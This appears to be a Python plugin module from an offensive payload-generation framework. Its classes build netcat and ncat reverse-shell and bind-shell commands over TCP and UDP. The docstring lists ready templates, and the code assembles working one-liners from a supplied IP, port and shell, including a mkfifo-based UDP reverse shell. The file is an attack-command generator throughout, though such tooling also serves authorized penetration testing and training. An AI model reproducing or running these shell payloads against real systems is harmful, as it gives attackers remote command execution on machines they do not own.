from ogabog.cores import plugin, const

"""
Create reverse shell and bind shell from ncat, nc
Format
|    |    rev tcp                  | rev udp  | bind tcp                   | bind udp
ncat | ncat -e <shell> <ip> <port> | specific | ncat -e <shell> -lp <port> | ncat -e <shell> -lup <port>
nc   | nc -c <shell> <ip> <port>   | specific | nc -c <shell> -lp <port>   | specific
ncat (nmap's netcat) supports ssl, --ssh-exec for execute /bin/bash command, --lua-exec for execute lua command as well
"""


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--type",
            default="ncat",
            choices=[
                'nc',
                'ncat'
            ],
            help="Select netcat type: tradition, ncat (default: ncat)"
        )
        self.add_args(
            "--shell",
            default="/bin/bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "[ReverseShell][TCP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = f"{self.args.type} "
        if self.args.type == "ncat":
            self.shell += "-e "
        else:
            self.shell += "-c "
        self.shell += f"{self.args.shell} {self.args.ip} {self.args.port}"


class ReverseUDP(ReverseTCP):
    def __init__(self):
        super().__init__()
        self.is_udp = True
        self.opts.description = "[ReverseShell][UDP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."

    def make_shell(self):
        if self.args.type == "ncat":
            # TODO reverse UDP for ncat
            print("[!] Framework doesn't support Reverse UDP for ncat")
        else:
            self.shell = f"mkfifo fifo; {self.args.type} -u {self.args.ip} {self.args.port} "
            self.shell += "< fifo | {"
            self.shell += f"{self.args.shell} -i; "
            self.shell += "} > fifo"


class BindTCP(plugin.BindShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="/bin/bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.add_args(
            "--type",
            default="ncat",
            choices=[
                'nc',
                'ncat'
            ],
            help="Select netcat type: tradition, ncat (default: ncat)"
        )
        self.opts.description = "[BindShell][TCP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = f"{self.args.type} "
        if self.args.type == "ncat":
            self.shell += "-e "
        else:
            self.shell += "-c "
        self.shell += f"{self.args.shell} -lp {self.args.port}"


class BindUDP(BindTCP):
    def __init__(self):
        super().__init__()
        self.opts.description = "[BindShell][UDP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.is_udp = True

    def make_shell(self):
        if self.args.type == "ncat":
            self.shell += f"-e {self.args.shell} -lup {self.args.port}"
        else:
            # TODO Bind UDP for nc
            print("[!] Framework doesn't support Bind UDP for nc")